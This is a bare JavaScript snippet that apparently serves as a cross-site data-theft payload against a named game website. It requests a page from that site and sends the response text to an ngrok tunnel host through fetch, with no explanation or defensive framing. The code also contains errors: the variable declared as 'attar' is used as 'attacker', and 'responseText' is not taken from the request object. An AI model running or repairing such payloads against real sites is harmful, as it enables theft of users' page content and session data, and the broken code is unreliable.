var url = "https://www.rappelzmaestro.com/";
var attar = 'https://98bf-2001-16a2-cd03-2a00-f480-e357-93c7-6a37.ngrok.io';

var xhr  = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        const a323 = responseText
        fetch(attacker + "?" + a323)
    }
}
xhr.open('GET', url, true);
xhr.send(null);
